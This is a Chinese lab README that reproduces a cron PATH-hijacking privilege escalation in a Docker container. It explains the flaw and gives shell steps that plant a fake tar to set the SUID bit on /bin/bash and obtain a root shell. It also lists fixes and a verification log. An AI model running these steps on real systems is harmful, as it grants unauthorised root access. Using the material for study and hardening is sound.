# Cron 计划任务提权（PATH 劫持）

## 原理

root 的 cron 脚本执行 `export PATH=/home/lowpriv/bin:$PATH` 后调用 `tar`
（不带绝对路径）。系统按 PATH 顺序查找 tar——**先找到 /home/lowpriv/bin/tar
（攻击者伪造的）而不是 /usr/bin/tar**，于是恶意 tar 以 root 身份执行。

## 环境

- 基础镜像：ubuntu:20.04
- 低权限用户：lowpriv / lowpriv123
- 漏洞配置：/home/lowpriv/bin 权限 777；root cron 脚本 export PATH 包含该目录并调用相对路径命令

## 复现步骤

```bash
# 1. 构建并启动
docker compose up -d --build

# 2. 进入低权限用户
docker exec -it $(docker compose ps -q) su - lowpriv

# 3. 在 PATH 最前端伪造 tar
cat > /home/lowpriv/bin/tar <<'EOF'
#!/bin/bash
chmod u+s /bin/bash
EOF
chmod +x /home/lowpriv/bin/tar

# 4. 等待 cron 执行 (最多 65 秒)
sleep 65

# 5. 验证提权
ls -l /bin/bash
# 预期输出: -rwsr-xr-x 1 root root ... /bin/bash
/bin/bash -p -c 'id'
# 预期输出: euid=0(root)   提权成功!

# 6. 一键利用
bash exploit.sh
```

## 为什么能成功

- 脚本内 `export PATH=/home/lowpriv/bin:$PATH` 把用户目录放在 PATH 最前
- cron 以 root 运行脚本, 调用 `tar` 时命中伪造的 /home/lowpriv/bin/tar
- 恶意 tar 内容（chmod u+s /bin/bash）以 root 执行

## 防御

- 脚本内所有命令使用绝对路径（/usr/bin/tar）
- 不把用户可写目录加入 PATH
- cron 默认 PATH 是 /usr/bin:/bin, 警惕脚本内部 export PATH 的写法

## 验证记录

2026-08-26 真实环境验证：注入后等待 65 秒，`/bin/bash -p -c 'id'` 输出
`uid=1000(lowpriv) ... euid=0(root)`。复现成功。
